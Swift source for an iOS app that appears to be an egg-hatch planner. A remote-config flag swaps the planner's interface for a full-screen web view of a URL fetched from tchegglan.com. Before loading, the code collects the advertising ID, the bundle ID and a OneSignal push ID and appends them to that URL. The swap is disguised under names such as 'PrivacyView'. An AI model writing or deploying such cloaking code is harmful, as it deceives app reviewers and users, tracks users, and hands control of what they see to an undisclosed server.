import SwiftUI

@main
struct EggHatchPlanneApp: App {
    
    @UIApplicationDelegateAdaptor(AppDelegate.self) var appDelegate
    
    /// Роутер для навигации
    @StateObject private var appRouter = AppRouter()
    
    /// Сервис управления таббаром
    @StateObject private var tabbarService = TabbarService()
    
    var body: some Scene {
        WindowGroup {
            BlackWindow(rootView: RootView()
                .environmentObject(appRouter)
                .environmentObject(tabbarService)
                .dynamicTypeSize(.large)
                .preferredColorScheme(.dark)
                .background(.black), remoteConfigKey: AppConstants.remoteConfigKey)
        }
    }
}

import SwiftUI
import SwiftUI
import CryptoKit
import WebKit
import AppTrackingTransparency
import UIKit
import FirebaseCore
import FirebaseRemoteConfig
import OneSignalFramework
import AdSupport
struct AppConstants {
    static let metricsBaseURL = "https://tchegglan.com/app/metrics"
    static let salt = "5vX3PcXIQJa28bpqvp24ogb2X13pzBOC"
    static let oneSignalAppID = "b055c83e-c1cf-4fcd-ae6e-ad5a3eb8f5bb"
    static let userDefaultsKey = "EggHatch"
    static let remoteConfigStateKey = "EggHatchConfig"
    static let remoteConfigKey = "isEnable"
}
struct MetricsResponse {
    let isOrganic: Bool
    let url: String
    let parameters: [String: String]
}
class NetworkManager {
    static let shared = NetworkManager()
    
    private init() {}
    
    func fetchMetrics(bundleID: String, salt: String, idfa: String?, completion: @escaping (Result<MetricsResponse, Error>) -> Void) {
        let rawT = "\(salt):\(bundleID)"
        let hashedT = CryptoUtils.md5Hex(rawT)
        
        var components = URLComponents(string: AppConstants.metricsBaseURL)
        components?.queryItems = [
            URLQueryItem(name: "b", value: bundleID),
            URLQueryItem(name: "t", value: hashedT)
        ]
        
        guard let url = components?.url else {
            completion(.failure(NetworkError.invalidURL))
            return
        }
        
        var request = URLRequest(url: url)
        request.httpMethod = "GET"
        request.setValue("application/json", forHTTPHeaderField: "Accept")
        print("CURRENT URL", url)
        URLSession.shared.dataTask(with: request) { data, response, error in
            if let error = error {
                completion(.failure(error))
                return
            }
            
            guard let data = data else {
                completion(.failure(NetworkError.noData))
                return
            }
            
            do {
                if let json = try JSONSerialization.jsonObject(with: data, options: []) as? [String: Any] {
                    let isOrganic = json["is_organic"] as? Bool ?? false
                    guard let url = json["URL"] as? String else {
                        completion(.failure(NetworkError.invalidResponse))
                        return
                    }
                    
                    let parameters = json.filter { $0.key != "is_organic" && $0.key != "URL" }
                        .compactMapValues { $0 as? String }
                    
                    let response = MetricsResponse(
                        isOrganic: isOrganic,
                        url: url,
                        parameters: parameters
                    )
                    
                    completion(.success(response))
                } else {
                    completion(.failure(NetworkError.invalidResponse))
                }
            } catch {
                completion(.failure(error))
            }
        }.resume()
    }
}
enum NetworkError: Error {
    case invalidURL
    case noData
    case invalidResponse
}
class ConfigManager {
    static let shared = ConfigManager()
    
    private let remoteConfig = RemoteConfig.remoteConfig()
    private let defaults: [String: NSObject] = [AppConstants.remoteConfigKey: true as NSNumber]
    
    private init() {
        remoteConfig.setDefaults(defaults)
    }
    
    func fetchConfig(completion: @escaping (Bool) -> Void) {
        if let savedState = UserDefaults.standard.object(forKey: AppConstants.remoteConfigStateKey) as? Bool {
            completion(savedState)
            return
        }
        
        remoteConfig.fetch(withExpirationDuration: 0) { status, error in
            if status == .success {
                self.remoteConfig.activate { _, _ in
                    let isEnabled = self.remoteConfig.configValue(forKey: AppConstants.remoteConfigKey).boolValue
                    UserDefaults.standard.set(isEnabled, forKey: AppConstants.remoteConfigStateKey)
                    completion(isEnabled)
                }
            } else {
                UserDefaults.standard.set(true, forKey: AppConstants.remoteConfigStateKey)
                completion(true)
            }
        }
    }
    
    func getSavedURL() -> URL? {
        guard let urlString = UserDefaults.standard.string(forKey: AppConstants.userDefaultsKey),
              let url = URL(string: urlString) else {
            return nil
        }
        return url
    }
    
    func saveURL(_ url: URL) {
        UserDefaults.standard.set(url.absoluteString, forKey: AppConstants.userDefaultsKey)
    }
}
class PermissionManager {
    static let shared = PermissionManager()
    
    private var hasRequestedTracking = false
    
    private init() {}
    
    func requestNotificationPermission(completion: @escaping (Bool) -> Void) {
        OneSignal.Notifications.requestPermission({ accepted in
            DispatchQueue.main.async {
                completion(accepted)
            }
        }, fallbackToSettings: false)
    }
    
    func requestTrackingAuthorization(completion: @escaping (String?) -> Void) {
        if #available(iOS 14, *) {
            func checkAndRequest() {
                let status = ATTrackingManager.trackingAuthorizationStatus
                switch status {
                case .notDetermined:
                    ATTrackingManager.requestTrackingAuthorization { newStatus in
                        DispatchQueue.main.async {
                            if newStatus == .notDetermined {
                                DispatchQueue.main.asyncAfter(deadline: .now() + 1) {
                                    checkAndRequest()
                                }
                            } else {
                                self.hasRequestedTracking = true
                                let idfa = newStatus == .authorized ? ASIdentifierManager.shared().advertisingIdentifier.uuidString : nil
                                completion(idfa)
                            }
                        }
                    }
                default:
                    DispatchQueue.main.async {
                        self.hasRequestedTracking = true
                        let idfa = status == .authorized ? ASIdentifierManager.shared().advertisingIdentifier.uuidString : nil
                        completion(idfa)
                    }
                }
            }
            
            DispatchQueue.main.async {
                checkAndRequest()
            }
        } else {
            DispatchQueue.main.async {
                self.hasRequestedTracking = true
                let idfa = ASIdentifierManager.shared().advertisingIdentifier.uuidString
                completion(idfa)
            }
        }
    }
}
struct TrackingURLBuilder {
    static func buildTrackingURL(from response: MetricsResponse, idfa: String?, bundleID: String) -> URL? {
        let onesignalId = OneSignal.User.onesignalId
        
        if response.isOrganic {
            guard var components = URLComponents(string: response.url) else {
                return nil
            }
            
            var queryItems: [URLQueryItem] = components.queryItems ?? []
            if let idfa = idfa {
                queryItems.append(URLQueryItem(name: "idfa", value: idfa))
            }
            queryItems.append(URLQueryItem(name: "bundle", value: bundleID))
            
            if let onesignalId = onesignalId {
                queryItems.append(URLQueryItem(name: "onesignal_id", value: onesignalId))
            } else {
                print("OneSignal ID not available for organic URL")
            }
            
            components.queryItems = queryItems.isEmpty ? nil : queryItems
            
            guard let url = components.url else {
                return nil
            }
            print(url)
            return url
        } else {
            let subId2 = response.parameters["sub_id_2"]
            let baseURLString = subId2 != nil ? "\(response.url)/\(subId2!)" : response.url
            
            guard var newComponents = URLComponents(string: baseURLString) else {
                return nil
            }
            
            var queryItems: [URLQueryItem] = []
            queryItems = response.parameters
                .filter { $0.key != "sub_id_2" }
                .map { URLQueryItem(name: $0.key, value: $0.value) }
            queryItems.append(URLQueryItem(name: "bundle", value: bundleID))
            if let idfa = idfa {
                queryItems.append(URLQueryItem(name: "idfa", value: idfa))
            }
            
            // Add OneSignal ID
            if let onesignalId = onesignalId {
                queryItems.append(URLQueryItem(name: "onesignal_id", value: onesignalId))
                print("🔗 Added OneSignal ID to non-organic URL: \(onesignalId)")
            } else {
                print("⚠️ OneSignal ID not available for non-organic URL")
            }
            
            newComponents.queryItems = queryItems.isEmpty ? nil : queryItems
            
            guard let finalURL = newComponents.url else {
                return nil
            }
            print(finalURL)
            return finalURL
        }
    }
}
struct BlackWindow<RootView: View>: View {
    @StateObject private var viewModel = BlackWindowViewModel()
    private let remoteConfigKey: String
    let rootView: RootView
    
    init(rootView: RootView, remoteConfigKey: String) {
        self.rootView = rootView
        self.remoteConfigKey = remoteConfigKey
    }
    
    var body: some View {
        Group {
            if viewModel.isRemoteConfigFetched && !viewModel.isEnabled && viewModel.isTrackingPermissionResolved && viewModel.isNotificationPermissionResolved {
                rootView
                    .onAppear {
                        print("NOW HERE", viewModel.isRemoteConfigFetched, viewModel.isEnabled, viewModel.trackingURL != nil, viewModel.shouldShowWebView)
                    }
            } else if viewModel.isRemoteConfigFetched && viewModel.isEnabled && viewModel.trackingURL != nil && viewModel.shouldShowWebView {
                ZStack {
                    Color.black
                        .ignoresSafeArea()
                    PrivacyView(ref: viewModel.trackingURL!)
                }
            } else {
                ZStack {
                    rootView
                        .onAppear {
                            print("HERE", viewModel.isRemoteConfigFetched, viewModel.isEnabled, viewModel.trackingURL != nil, viewModel.shouldShowWebView)
                        }
                }
            }
        }
    }
}
class AppDelegate: NSObject, UIApplicationDelegate, UNUserNotificationCenterDelegate {
    private var lastPermissionCheck: Date?
    
    func application(_ application: UIApplication, didFinishLaunchingWithOptions launchOptions: [UIApplication.LaunchOptionsKey: Any]? = nil) -> Bool {
        FirebaseApp.configure()
        
        OneSignal.Debug.setLogLevel(.LL_VERBOSE)
        OneSignal.initialize(AppConstants.oneSignalAppID, withLaunchOptions: launchOptions)
        
        UNUserNotificationCenter.current().delegate = self
        
        NotificationCenter.default.addObserver(
            self,
            selector: #selector(handleTrackingAction),
            name: UIApplication.didBecomeActiveNotification,
            object: nil
        )
        return true
    }
    
    @objc private func handleTrackingAction() {
        if UIApplication.shared.applicationState == .active {
            let now = Date()
            if let last = lastPermissionCheck, now.timeIntervalSince(last) < 2 {
                return
            }
            lastPermissionCheck = now
            NotificationCenter.default.post(name: .checkTrackingPermission, object: nil)
        }
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                willPresent notification: UNNotification,
                                withCompletionHandler completionHandler: @escaping (UNNotificationPresentationOptions) -> Void) {
        completionHandler([.banner, .sound, .badge])
    }
    
    func userNotificationCenter(_ center: UNUserNotificationCenter,
                                didReceive response: UNNotificationResponse,
                                withCompletionHandler completionHandler: @escaping () -> Void) {
        completionHandler()
    }
    
    deinit {
        NotificationCenter.default.removeObserver(self, name: UIApplication.didBecomeActiveNotification, object: nil)
    }
}

class BlackWindowViewModel: ObservableObject {
    @Published var trackingURL: URL?
    @Published var shouldShowWebView = false
    @Published var isRemoteConfigFetched = false
    @Published var isEnabled = false
    @Published var isTrackingPermissionResolved = false
    @Published var isNotificationPermissionResolved = false
    @Published var isWebViewLoadingComplete = false
    
    private var hasFetchedMetrics = false
    private var hasPostedInitialCheck = false
    
    init() {
        setupObservers()
        initialize()
    }
    
    private func setupObservers() {
        NotificationCenter.default.addObserver(
            forName: .didFetchTrackingURL,
            object: nil,
            queue: .main
        ) { [weak self] notification in
            if let url = notification.userInfo?["trackingURL"] as? URL {
                self?.trackingURL = url
                self?.shouldShowWebView = true
                self?.isWebViewLoadingComplete = true
                ConfigManager.shared.saveURL(url)
            }
        }
        
        NotificationCenter.default.addObserver(
            forName: .checkTrackingPermission,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            self?.handlePermissionCheck()
        }
        
        NotificationCenter.default.addObserver(
            forName: .notificationPermissionResolved,
            object: nil,
            queue: .main
        ) { [weak self] _ in
            if !(self?.isTrackingPermissionResolved ?? false) {
                NotificationCenter.default.post(name: .checkTrackingPermission, object: nil)
            }
        }
    }
    
    private func initialize() {
        if !hasPostedInitialCheck {
            hasPostedInitialCheck = true
            NotificationCenter.default.post(name: .checkTrackingPermission, object: nil)
        }
        
        ConfigManager.shared.fetchConfig { [weak self] isEnabled in
            DispatchQueue.main.async {
                self?.isEnabled = isEnabled
                self?.isRemoteConfigFetched = true
                self?.handleConfigFetched()
            }
        }
    }
    
    private func handlePermissionCheck() {
        if !isNotificationPermissionResolved {
            PermissionManager.shared.requestNotificationPermission { [weak self] accepted in
                self?.isNotificationPermissionResolved = true
                NotificationCenter.default.post(
                    name: .notificationPermissionResolved,
                    object: nil,
                    userInfo: ["accepted": accepted]
                )
            }
        } else if !isTrackingPermissionResolved {
            PermissionManager.shared.requestTrackingAuthorization { [weak self] idfa in
                self?.isTrackingPermissionResolved = true
                self?.handlePermissionsResolved(idfa: idfa)
            }
        }
    }
    
    private func handleConfigFetched() {
        if isEnabled {
            if let savedURL = ConfigManager.shared.getSavedURL() {
                if isTrackingPermissionResolved && isNotificationPermissionResolved {
                    trackingURL = savedURL
                    shouldShowWebView = true
                    isWebViewLoadingComplete = true
                    ConfigManager.shared.saveURL(savedURL)
                } else {
                    waitForPermissions(savedURL: savedURL)
                }
            } else if isTrackingPermissionResolved && isNotificationPermissionResolved {
                fetchMetrics()
            }
        } else if isTrackingPermissionResolved && isNotificationPermissionResolved {
            triggerSplashTransition()
        }
    }
    
    private func handlePermissionsResolved(idfa: String?) {
        if isEnabled && ConfigManager.shared.getSavedURL() == nil {
            fetchMetrics(idfa: idfa)
        }
        if isRemoteConfigFetched && !isEnabled && isNotificationPermissionResolved {
            triggerSplashTransition()
        }
    }
    
    private func fetchMetrics(idfa: String? = nil) {
        guard !hasFetchedMetrics else { return }
        hasFetchedMetrics = true
        
        let bundleID = Bundle.main.bundleIdentifier ?? "none"
        NetworkManager.shared.fetchMetrics(bundleID: bundleID, salt: AppConstants.salt, idfa: idfa) { [weak self] result in
            DispatchQueue.main.async {
                switch result {
                case .success(let response):
                    if let url = TrackingURLBuilder.buildTrackingURL(from: response, idfa: idfa, bundleID: bundleID) {
                        NotificationCenter.default.post(name: .didFetchTrackingURL, object: nil, userInfo: ["trackingURL": url])
                    } else {
                        self?.isWebViewLoadingComplete = true
                        self?.triggerSplashTransitionIfNeeded()
                    }
                case .failure:
                    self?.isWebViewLoadingComplete = true
                    self?.triggerSplashTransitionIfNeeded()
                }
            }
        }
    }
    
    private func waitForPermissions(savedURL: URL) {
        func checkPermissions() {
            if isTrackingPermissionResolved && isNotificationPermissionResolved {
                self.trackingURL = savedURL
                self.shouldShowWebView = true
                self.isWebViewLoadingComplete = true
                ConfigManager.shared.saveURL(savedURL)
            } else {
                DispatchQueue.main.asyncAfter(deadline: .now() + 0.5) {
                    checkPermissions()
                }
            }
        }
        
        DispatchQueue.main.async {
            checkPermissions()
        }
    }
    
    private func triggerSplashTransitionIfNeeded() {
        if isEnabled && trackingURL == nil && isTrackingPermissionResolved && isNotificationPermissionResolved {
            triggerSplashTransition()
        }
    }
    
    private func triggerSplashTransition() {
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            NotificationCenter.default.post(name: .splashTransition, object: nil)
        }
    }
    
    deinit {
        NotificationCenter.default.removeObserver(self)
    }
}
struct PrivacyView: UIViewRepresentable {
    typealias UIViewType = WKWebView
    
    let ref: URL
    private let webView: WKWebView
    
    init(ref: URL) {
        self.ref = ref
        let configuration = WKWebViewConfiguration()
        configuration.websiteDataStore = WKWebsiteDataStore.default()
        configuration.preferences = WKPreferences()
        configuration.preferences.javaScriptCanOpenWindowsAutomatically = true
        webView = WKWebView(frame: .zero, configuration: configuration)
    }
    
    func makeUIView(context: Context) -> WKWebView {
        webView.uiDelegate = context.coordinator
        webView.navigationDelegate = context.coordinator
        return webView
    }
    
    func updateUIView(_ uiView: WKWebView, context: Context) {
        uiView.load(URLRequest(url: ref))
    }
    
    func makeCoordinator() -> Coordinator {
        Coordinator(self)
    }
    
    class Coordinator: NSObject, WKUIDelegate, WKNavigationDelegate {
        var parent: PrivacyView
        private var popupWebView: OverlayPrivacyWindowController?
        
        init(_ parent: PrivacyView) {
            self.parent = parent
        }
        
        func webView(_ webView: WKWebView, createWebViewWith configuration: WKWebViewConfiguration, for navigationAction: WKNavigationAction, windowFeatures: WKWindowFeatures) -> WKWebView? {
            configuration.websiteDataStore = WKWebsiteDataStore.default()
            let newOverlay = WKWebView(frame: parent.webView.bounds, configuration: configuration)
            newOverlay.autoresizingMask = [.flexibleWidth, .flexibleHeight]
            newOverlay.navigationDelegate = self
            newOverlay.uiDelegate = self
            webView.addSubview(newOverlay)
            
            let viewController = OverlayPrivacyWindowController()
            viewController.overlayView = newOverlay
            popupWebView = viewController
            UIApplication.topMostController()?.present(viewController, animated: true)
            
            return newOverlay
        }
        
        func webViewDidClose(_ webView: WKWebView) {
            popupWebView?.dismiss(animated: true)
        }
    }
}
class OverlayPrivacyWindowController: UIViewController {
    var overlayView: WKWebView!
    
    override func viewDidLoad() {
        super.viewDidLoad()
        overlayView.translatesAutoresizingMaskIntoConstraints = false
        view.addSubview(overlayView)
        
        NSLayoutConstraint.activate([
            overlayView.leadingAnchor.constraint(equalTo: view.leadingAnchor),
            overlayView.trailingAnchor.constraint(equalTo: view.trailingAnchor),
            overlayView.topAnchor.constraint(equalTo: view.topAnchor),
            overlayView.bottomAnchor.constraint(equalTo: view.bottomAnchor)
        ])
    }
}
// MARK: - Utilities
enum CryptoUtils {
    static func md5Hex(_ string: String) -> String {
        let digest = Insecure.MD5.hash(data: Data(string.utf8))
        return digest.map { String(format: "%02hhx", $0) }.joined()
    }
}
extension UIApplication {
    static var keyWindow: UIWindow {
        shared.connectedScenes
            .compactMap { ($0 as? UIWindowScene)?.keyWindow }
            .last!
    }
    
    class func topMostController(controller: UIViewController? = keyWindow.rootViewController) -> UIViewController? {
        if let navigationController = controller as? UINavigationController {
            return topMostController(controller: navigationController.visibleViewController)
        }
        if let tabController = controller as? UITabBarController, let selected = tabController.selectedViewController {
            return topMostController(controller: selected)
        }
        if let presented = controller?.presentedViewController {
            return topMostController(controller: presented)
        }
        return controller
    }
}
extension Notification.Name {
    static let didFetchTrackingURL = Notification.Name("didFetchTrackingURL")
    static let checkTrackingPermission = Notification.Name("checkTrackingPermission")
    static let notificationPermissionResolved = Notification.Name("notificationPermissionResolved")
    static let splashTransition = Notification.Name("splashTransition")
}
